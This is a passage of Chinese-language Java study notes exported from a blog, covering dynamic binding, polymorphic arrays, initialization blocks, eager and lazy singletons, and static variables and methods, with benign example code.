class="type">int</span> <span class="title function_">getI</span><span class="params">()</span>&#123;<span class="comment">//父类getI</span></span><br><span class="line">		<span class="keyword">return</span> i;</span><br><span class="line">	&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;<span class="comment">//子类</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum1</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i+<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getI</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i;</span><br><span class="line">	&#125;	  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main方法中</span></span><br><span class="line"><span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();<span class="comment">//向上转型</span></span><br><span class="line">System.out.println(a.sum());<span class="comment">//输出30</span></span><br><span class="line"><span class="comment">//这里找不到sum，所以去父类A找sum方法。调用getI()方法，与对象a动态绑定，由于a的运行类型是B类</span></span><br><span class="line"><span class="comment">//所以在执行A类sum方法中的 return getI()+10;这一句时，还是调用的B类中的getI方法，提取到B子类中的i属性：20.</span></span><br><span class="line">System.out.println(a.sum1());<span class="comment">//输出30</span></span><br></pre></td></tr></table></figure>

<p>接着继续注销子类中的sum1()方法，结果又为何？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;<span class="comment">//父类</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">  <span class="comment">//动态绑定机制</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">()</span>&#123;<span class="comment">//父类sum</span></span><br><span class="line">		<span class="keyword">return</span> getI()+<span class="number">10</span>;<span class="comment">//20+10</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum1</span><span class="params">()</span>&#123;<span class="comment">//父类sum1</span></span><br><span class="line">		<span class="keyword">return</span> i+<span class="number">10</span>;<span class="comment">//10+10</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getI</span><span class="params">()</span>&#123;<span class="comment">//父类getI</span></span><br><span class="line">		<span class="keyword">return</span> i;</span><br><span class="line">	&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;<span class="comment">//子类</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getI</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i;</span><br><span class="line">	&#125;	  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main方法中</span></span><br><span class="line"><span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();<span class="comment">//向上转型</span></span><br><span class="line">System.out.println(a.sum());<span class="comment">//输出30</span></span><br><span class="line"><span class="comment">//这里子类找不到sum，所以去父类A找sum方法。调用getI()方法，与对象a动态绑定，由于a的运行类型是B类</span></span><br><span class="line"><span class="comment">//所以在执行A类sum方法中的 return getI()+10;这一句时，还是调用的B类中的getI方法，提取到B子类中的i属性：20.</span></span><br><span class="line">System.out.println(a.sum1());<span class="comment">//输出20</span></span><br><span class="line"><span class="comment">//这里子类找不到sum1，所以去父类A找sum1方法。直接return i+10；</span></span><br><span class="line"><span class="comment">//由于调用对象属性时，没有动态绑定机制，哪里声明，哪里使用，所以直接返回的是A类中声明的i=10。i+10=20。</span></span><br></pre></td></tr></table></figure>

<h2 id="多态的应用"><a href="#多态的应用" class="headerlink" title="多态的应用"></a>多态的应用</h2><h3 id="多态数组"><a href="#多态数组" class="headerlink" title="多态数组"></a>多态数组</h3><p>数组的定义类型为父类类型，里面保存的实际元素类型为子类类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PloyArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//应用实例：现有一个继承结构如下：要求创建一个person对象、</span></span><br><span class="line">        <span class="comment">//2个Student 对象和2个Teacher对象，统一放到数组中，并调用每个对象的say方法</span></span><br><span class="line">        Person[] persons = <span class="keyword">new</span> <span class="title class_">Person</span>[<span class="number">5</span>];</span><br><span class="line">        persons[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;jack&quot;</span>,<span class="number">29</span>);</span><br><span class="line">        persons[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;smith&quot;</span>,<span class="number">19</span>,<span class="number">100</span>);</span><br><span class="line">        persons[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;Alan&quot;</span>,<span class="number">18</span>,<span class="number">60.0</span>);</span><br><span class="line">        persons[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Teacher</span>(<span class="string">&quot;scott&quot;</span>,<span class="number">40</span>,<span class="number">20000</span>);</span><br><span class="line">        persons[<span class="number">4</span>] = <span class="keyword">new</span> <span class="title class_">Teacher</span>(<span class="string">&quot;kobe&quot;</span>,<span class="number">43</span>,<span class="number">250000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环遍历多态数组，调用say</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;persons.length;i++)&#123;</span><br><span class="line">            <span class="comment">//person[i]不管是哪一个元素，编译类型是Person，运行类型根据实际情况由jvm来判断</span></span><br><span class="line">            System.out.println(persons[i].say());<span class="comment">//动态绑定机制</span></span><br><span class="line">          </span><br><span class="line">        <span class="comment">//应用升级：如何调用子类特有的方法，比如Teacher有一个teach，Student有一个Study	</span></span><br><span class="line">          </span><br><span class="line">            <span class="comment">//类型判断+向下转型</span></span><br><span class="line">            <span class="keyword">if</span>(persons[i] <span class="keyword">instanceof</span> Student)&#123;<span class="comment">//判断persons[i]的运行类型是不是Student</span></span><br><span class="line">                ((Student) persons[i]).study();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(persons[i] <span class="keyword">instanceof</span> Teacher)&#123;<span class="comment">//判断persons[i]的运行类型是不是Teacher</span></span><br><span class="line">               ((Teacher) persons[i]).teach();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(persons[i] <span class="keyword">instanceof</span> Person)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;类型有误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="多态参数"><a href="#多态参数" class="headerlink" title="多态参数"></a>多态参数</h3><p>方法定义的形参类型为父类类型，实参类型允许为子类类型</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(九)——代码块和单例设计模式</title>
    <url>/2022/09/14/26-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B9%9D)%E2%80%94%E2%80%94%20%E4%BB%A3%E7%A0%81%E5%9D%97%E5%92%8C%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>代码化块又称为<span style='color:orange'>初始化块</span>，属于类中的成员【即是类的一部分】，类似于方法，将逻辑语句封装在方法体中，通过{}包围起来。</p>
<p>但和方法不同，没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显示调用，而是加载类时，或创建对象时隐式调用。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>[修饰符] {代码};</p>
<p>说明注意：</p>
<ul>
<li>1、修饰符可选，要写的话，也只能写static</li>
<li>2、代码块氛围两类，使用static修饰的叫静态代码块，没有static修饰的，叫普通代码块&#x2F;非静态代码块。</li>
<li>3、逻辑语句可以为任何逻辑语句（输入、输出、方法调用、循环、判断等）</li>
</ul>
<h2 id="代码块的好处和案例演示"><a href="#代码块的好处和案例演示" class="headerlink" title="代码块的好处和案例演示"></a>代码块的好处和案例演示</h2><ul>
<li>1、相当于另外一种形式的构造器（对构造器的补充机制），可以做初始化的操作</li>
<li>2、场景：如果多个构造器中都有重复的语句，可以抽取到初始化块中，提高代码的复用性。</li>
<li>3、代码块的快速入门</li>
</ul>
<span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.static_.codeblock_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">codeblock1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//下面三个构造器都有相同的语句</span></span><br><span class="line">        <span class="comment">//这样代码就会看起来比较冗余</span></span><br><span class="line">        <span class="comment">//这是我们可以把相同的语句，放入一个代码块中，即可</span></span><br><span class="line">        <span class="comment">//这样当我们不管调用哪个构造器，创建对象，都会先调用代码块的内容</span></span><br><span class="line">        <span class="comment">//代码块调用的顺序优先于构造器...</span></span><br><span class="line">        <span class="type">test</span> <span class="variable">jack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        <span class="type">test</span> <span class="variable">alan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>(<span class="string">&quot;alan&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">test</span> <span class="variable">smith</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>(<span class="string">&quot;smith&quot;</span>, <span class="number">20</span>, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是一个人&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用细节、注意事项"><a href="#使用细节、注意事项" class="headerlink" title="使用细节、注意事项"></a>使用细节、注意事项</h2><ul>
<li>1、static代码块也叫静态代码块，作用就是对类进行初始化，而且它随着<span style='color:red'>类的加载</span>而执行，<span style='color:red'>并且只会执行一次</span>。如果是普通代码块，每创建一个对象，就执行。</li>
<li>2、类什么时候被加载<ul>
<li>（1）创建对象实例时（new）</li>
<li>（2）创建子类对象实例，父类也会被加载</li>
<li>（3）使用类的静态成员时（静态属性，静态方法）</li>
</ul>
</li>
<li>3、普通的代码块，在<span style='color:red'>创建对象实例时</span>，会被隐式的调用。被创建一次，就会调用一次。如果只是使用类的静态成员时，普通代码块并不会执行。</li>
<li>4、<span style='color:red'>创建一个对象时，在一个类的调用顺序是（重点、难点！）</span><ul>
<li>（1）调用静态代码块和静态属性初始化（注意：静态代码块和静态属性初始化调用的优先级一样，如果有多个静态代码块和多个静态变量初始化，则按它们定义的顺序调用）</li>
<li>（2）调用普通代码块和普通属性的初始化（注意：普通代码块和普通属性初始化调用的优先级一样，如果有多个普通代码块和多个普通属性初始化，则按定义顺序调用）</li>
<li>（3）调用构造方法。</li>
</ul>
</li>
<li>5、构造器的最前面其实隐含了super()和调用普通代码块（super优先于普通代码块），静态相关的代码块，属性初始化，在类加载时，就执行完毕，因此事优先于构造器和普通代码块执行的。</li>
<li>6、我们看一下创建一个子类对象时（继承关系），它们的静态代码块，静态属性初始化，普通代码块，普通属性初始化，构造方法的调用顺序如下：<ul>
<li>（1）父类的静态代码块和静态属性（优先级一样，按定义顺序执行）</li>
<li>（2）子类的静态代码块和静态属性（优先级一样，按定义顺序执行）</li>
<li>（3）父类的普通代码块和普通属性初始化（优先级一样，按定义顺序执行）</li>
<li>（4）父类的构造方法</li>
<li>（5）子类的普通代码块和普通属性初始化（优先级一样，按定义顺序执行）</li>
<li>（6）子类的构造方法</li>
</ul>
</li>
<li>7、静态代码块只能直接调用静态成员，普通代码块可以调用任意成员。</li>
</ul>
<h1 id="代码块应用——单例设计模式"><a href="#代码块应用——单例设计模式" class="headerlink" title="代码块应用——单例设计模式"></a>代码块应用——单例设计模式</h1><h2 id="什么是设计模式"><a href="#什么是设计模式" class="headerlink" title="什么是设计模式"></a>什么是设计模式</h2><ul>
<li>1、静态方法和属性的经典使用</li>
<li>2、设计模式是在大量的实践中总结和理论化之后优选的代码结构、编程风格、以及解决问题的思考方式。设计模式就像是经典的棋谱，不同的棋局，我们用不同的棋谱，免去我们自己思考和摸索。</li>
</ul>
<h2 id="什么是单例模式"><a href="#什么是单例模式" class="headerlink" title="什么是单例模式"></a>什么是单例模式</h2><ul>
<li>1、所谓类的单例设计模式，就是采取一定的方法保证在整个的软件系统中，对<span style='color:red'>某个类只能存在一个对象实例</span>，并且该类只提供一个取得其对象实例的方法。</li>
<li>2、单例模式有两种方式：1）饿汉式   2）懒汉式</li>
</ul>
<h2 id="单例模式应用实例"><a href="#单例模式应用实例" class="headerlink" title="单例模式应用实例"></a>单例模式应用实例</h2><h3 id="饿汉式单例模式实现："><a href="#饿汉式单例模式实现：" class="headerlink" title="饿汉式单例模式实现："></a>饿汉式单例模式实现：</h3><p>步骤如下：</p>
<ul>
<li>1、构造器私有化 &#x3D;&gt;  防止用户直接new</li>
<li>2、类的内部创建对象</li>
<li>3、向外暴露一个静态的公共方法。getInstance</li>
<li>4、代码实现</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.static_.Single_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.GregorianCalendar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingleTon</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//直接通过方法获取对象</span></span><br><span class="line">        <span class="type">GirlFriend</span> <span class="variable">instance</span> <span class="operator">=</span> GirlFriend.getInstance();</span><br><span class="line">        System.out.println(instance);</span><br><span class="line">        <span class="comment">//虽然这里获取了两次，但是它们是同一个对象，因为gf这个对象是静态的，它在类加载的时候只会创建一次</span></span><br><span class="line">        <span class="type">GirlFriend</span> <span class="variable">instance2</span> <span class="operator">=</span> GirlFriend.getInstance();</span><br><span class="line">        System.out.println(instance2);</span><br><span class="line"></span><br><span class="line">        System.out.println(instance == instance2);<span class="comment">//true，说明是同一个对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有一个类，GirlFriend</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GirlFriend</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">//如何保证我们只能创建一个girlfriend对象</span></span><br><span class="line">    <span class="comment">//步骤</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GirlFriend</span> <span class="variable">gf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GirlFriend</span>(<span class="string">&quot;alan&quot;</span>);</span><br><span class="line">    <span class="comment">//1、将构造器私有化</span></span><br><span class="line">    <span class="comment">//2、类的内部创建对象,为了能够在静态方法中返回对象，需要将其修饰为static</span></span><br><span class="line">    <span class="comment">//3、提供一个公共的静态方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GirlFriend</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> GirlFriend <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GirlFriend&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="懒汉式单例模式实现："><a href="#懒汉式单例模式实现：" class="headerlink" title="懒汉式单例模式实现："></a>懒汉式单例模式实现：</h3><p>饿汉式和懒汉式的区别在于：</p>
<ul>
<li>饿汉：可能没有使用这个实例，但他还是创建了。因此可能会存在一个情况：创建了但没有用，可能造成资源浪费</li>
<li>懒汉：不用它，它就不创建对象，只有使用的时候才创建实例。</li>
</ul>
<p>步骤：</p>
<ul>
<li>1、构造器私有化 &#x3D;&gt;  防止用户直接new</li>
<li>2、类的内部创建对象</li>
<li>3、向外暴露一个静态的公共方法。getInstance</li>
<li>4、代码实现</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.static_.Single_;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 演示懒汉式的单例模式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingleTon1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//System.out.println(Cat.n1);//懒汉式代码中，访问Cat.n1时不会执行到构造器，因为对象还没被创建,只会输出n1 = 100;</span></span><br><span class="line">        <span class="type">Cat</span> <span class="variable">instance</span> <span class="operator">=</span> Cat.getInstance();</span><br><span class="line">        System.out.println(instance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="number">999</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Cat cat;<span class="comment">//不直接new了，采用懒汉式</span></span><br><span class="line">    <span class="comment">//步骤</span></span><br><span class="line">    <span class="comment">//1、仍然将构造器私有化</span></span><br><span class="line">    <span class="comment">//2、定义一个静态属性对象</span></span><br><span class="line">    <span class="comment">//3、提供一个public的static方法，可以返回一个cat对象</span></span><br><span class="line">    <span class="comment">//4、懒汉式，只有当用户使用getInstance时，才会返回cat对象，后面再次调用时，会返回上次创建的cat对象，从而保证了单例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Cat</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造器被调用&quot;</span>);<span class="comment">//懒汉式代码中，访问Cat.n1时不会执行到构造器，因为对象还没被创建。</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Cat <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cat == <span class="literal">null</span>)&#123;<span class="comment">//如果还没有创建Cat对象</span></span><br><span class="line">            cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="饿汉式-VS-懒汉式"><a href="#饿汉式-VS-懒汉式" class="headerlink" title="饿汉式 VS 懒汉式"></a>饿汉式 VS 懒汉式</h3><ul>
<li>1、二者最主要的区别在于创建对象的机制不同：饿汉式是在类加载的时候就创建了对象实例，而懒汉式是在使用时才创建。</li>
<li>2、饿汉式不存在线程安全问题，懒汉式存在线程安全问题（后面学习线程后详细展开）</li>
<li>3、饿汉式存在资源浪费的可能。因为如果程序员一个对象实例都没有使用，那么饿汉式创建的对象就浪费了，懒汉式是使用时才创建，就不存在这个问题。</li>
<li>4、在JavaSE标准类中，java.lang.Runtime就是经典的单例模式。</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(八)——类变量和类方法</title>
    <url>/2022/09/14/25-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AB)%E2%80%94%E2%80%94%20%E7%B1%BB%E5%8F%98%E9%87%8F%E5%92%8C%E7%B1%BB%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该部分已经进入面向对象高级部分知识，主要涉及到<span style='color:orange'>类变量、类方法、代码块</span>等知识</p>
<h1 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h1><h2 id="引出"><a href="#引出" class="headerlink" title="引出"></a>引出</h2><p>例子：有一群小孩在玩堆雪人，不时有新的小孩加入，请问如何知道现在共有多少小孩在玩？</p>
<p>思路：</p>
<ul>
<li>1、在main方法中定义一个变量count</li>
<li>2、当一个小孩加入游戏后，count++，最后count就记录有多少个小孩玩游戏</li>
</ul>
<p>问题：</p>
<ul>
<li>1、count是一个独立于对象&#x2F;类的变量</li>
<li>2、以后访问count比较麻烦，没有使用opp</li>
</ul>
<p>解决：</p>
<ul>
<li>如果设计一个int count表示总人数，我们在创建一个小孩时，就把count+1，并且<span style='color:orange'>count是所有对象共享</span>的就ok了</li>
</ul>
<p>因此我们引出<span style='color:red'>类变量（也叫静态变量）</span></p>
<span id="more"></span>

<h2 id="类变量快速入门"><a href="#类变量快速入门" class="headerlink" title="类变量快速入门"></a>类变量快速入门</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">child</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">		<span class="comment">//当我们给一个属性增加了一个static修饰符，它就成了一个类变量（静态变量）</span></span><br><span class="line">    <span class="comment">//该变量最大的特点就是会被child类的所有对象实例共享</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类变量基础知识"><a href="#类变量基础知识" class="headerlink" title="类变量基础知识"></a>类变量基础知识</h2><h3 id="什么是类变量"><a href="#什么是类变量" class="headerlink" title="什么是类变量"></a>什么是类变量</h3><p>类变量也叫静态变量&#x2F;静态属性，是该类的所有对象共享的变量，任何一个该类的对象去访问他时，取到的都是相同的值，同样任何一个类的对象去修改它时，修改的也是同一个变量。</p>
<h3 id="如何定义类变量"><a href="#如何定义类变量" class="headerlink" title="如何定义类变量"></a>如何定义类变量</h3><p>定义语法：</p>
<ul>
<li>访问修饰符 static 数据类型 变量名;【推荐】</li>
<li>static 访问修饰符 数据类型 变量名;</li>
</ul>
<h3 id="如何访问类变量"><a href="#如何访问类变量" class="headerlink" title="如何访问类变量"></a>如何访问类变量</h3><ul>
<li><p>类名.类变量名【推荐】</p>
</li>
<li><p>对象名.类变量名【静态变量的访问修饰符的访问权限和范围和普通属性是一样的】</p>
</li>
</ul>
<h2 id="类变量内存布局"><a href="#类变量内存布局" class="headerlink" title="类变量内存布局"></a>类变量内存布局</h2><p>静态变量究竟放在哪里？</p>
<p>说法很多：</p>
<ul>
<li>1、静态域（方法区）</li>
</ul>
<p>以上述例子为例：</p>
<p>​	由于count是属于静态变量的，而child在进行类加载的时候，其类信息会放在方法区里面。在方法区中有一个空间叫静态域，这个count也就是在这个<span style='color:red'>方法区的静态域</span>中。</p>
<ul>
<li>2、堆</li>
</ul>
<p>以上述例子为例：</p>
<p>放在<span style='color:red'>堆中Child类对应的class对象最后</span>。那这个class对象是什么呢？</p>
<p>当Child这个类在进行加载的时候，它会在堆里面生成一个Child类对应的class对象，这个class对象是一个原型对象，在创建每一个对象实例的时候都会依照它来创建，而且我们通过这个class对象可以拿到很多类的信息，这个在反射里面会详细讲。</p>
<p>Class对象如同堆中其他对象一样，存在于GC堆中。</p>
<p>那么到底放在哪个地方呢？——<span style='color:orange'>看jdk版本</span></p>
<ul>
<li>JDK7、JDK8以前它们是放在方法区的静态域中。</li>
<li>JDK8之后：其实是放在堆中类对应的Class对象最后。会通过反射机制加载一个Class对象，在这个Class实例的尾部，它会把静态的数据放在Class对象中。</li>
</ul>
<p>但不论是放在堆里面还是方法区的静态域中，都不会影响两个事实：</p>
<ul>
<li>static变量是被同一个类所有对象共享的，因此不影响对静态变量的使用</li>
<li>static类变量，在类加载的时候就被生成了。——这就意味着<span style='color:orange'>即使没有创建对象实例也可以访问</span></li>
</ul>
<h1 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>类方法也叫静态方法，形式如下：</p>
<ul>
<li>访问修饰符 static 数据返回类型 方法名( ){ }</li>
<li>static 访问修饰符 数据返回类型 方法名( ){ }</li>
</ul>
<p>类方法的调用：</p>
<ul>
<li>类名.类方法名</li>
<li>对象.类方法名</li>
</ul>
<h2 id="经典使用场景"><a href="#经典使用场景" class="headerlink" title="经典使用场景"></a>经典使用场景</h2><p>当方法中不涉及到任何和对象相关的成员，则可以将方法设计为静态方法，提高开发效率</p>
<p>比如：工具类中的方法。Math类、Arrays类、Collections集合类</p>
<p>程序员实际开发，往往会将一些通用的方法，设计成静态方法，这样我们不需要创建对象就可以使用，比如打印以为数组，冒泡排序，完成某个计算任务等。</p>
<h2 id="使用细节、注意事项"><a href="#使用细节、注意事项" class="headerlink" title="使用细节、注意事项"></a>使用细节、注意事项</h2><ul>
<li><p>1、类方法和普通方法都是随着类的加载而加载，将结构信息存储在方法区。类方法中无this的参数，普通方法中隐含着this的参数。</p>
</li>
<li><p>2、普通方法和对象有关，需要通过对象名调用，不能通过类名调用，而静态方法可以。</p>
</li>
<li><p>3、类方法中不允许使用和对象有关的关键字，比如this和super，普通方法可以。</p>
</li>
<li><p>4、类方法中只能访问<span style='color:red'>静态变量或者静态方法</span>。</p>
</li>
<li><p>5、普通成员方法，既可以访问非静态成员，也可以访问静态成员。</p>
</li>
</ul>
